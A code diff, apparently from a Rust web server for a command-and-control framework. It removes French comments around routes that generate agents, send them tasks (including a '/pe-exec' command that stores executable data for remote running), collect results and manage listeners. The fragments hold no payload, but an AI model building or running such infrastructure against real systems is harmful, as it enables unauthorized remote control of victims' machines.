@@ -144,7 +144,6 @@ async fn list_agents(state: Data<AppState>, req: HttpRequest) -> impl Responder 
     HttpResponse::Ok().json(agents)
 }
 
-// NOUVELLE ROUTE : Génération d'agent avec configuration POST
 #[post("/api/generate")]
 async fn generate_agent_with_config(
     state: Data<AppState>,
@@ -260,7 +259,6 @@ async fn send_task(
         }
     };
 
-    // ========== TRAITEMENT SPÉCIAL POUR PE-EXEC ==========
     if payload.command.trim().starts_with("/pe-exec ") {
         log::info!("[+] PE-exec command detected, storing PE data...");
 
@@ -272,7 +270,6 @@ async fn send_task(
                     command_id
                 );
 
-                // Stocker les données PE dans la table dédiée
                 match state.database.store_pe_exec_data(command_id, &pe_data_b64) {
                     Ok(()) => {
                         log::info!(
@@ -305,7 +302,6 @@ async fn send_task(
         }
     }
 
-    // ========== LOGGER L'ACTION ==========
     if let Err(e) = state.database.log_agent_action(
         &payload.agent_id,
         "task_sent",
@@ -323,7 +319,7 @@ async fn send_task(
         ),
     })
 }
-// ========== NOUVELLE ROUTE: Récupération des données PE-exec ==========
+
 #[get("/api/results/{agent_id}")]
 async fn get_results(
     state: Data<AppState>,
@@ -339,7 +335,6 @@ async fn get_results(
 
     let agent_id = agent_id.into_inner();
 
-    // Récupérer les résultats depuis la base de données
     match state.database.get_agent_results(&agent_id) {
         Ok(results) => {
             log::info!(
@@ -479,7 +474,6 @@ async fn add_listener(
         }));
     }
 
-    // ===== HTTP Listener =====
     if let Err(e) = state.database.add_listener(
         &body.listener_name,
         &body.listener_type,
@@ -793,6 +787,7 @@ async fn download_result_file(
         })
         .body(file_data)
 }
+
 #[post("/api/upload")]
 async fn upload_files(
     state: Data<AppState>,
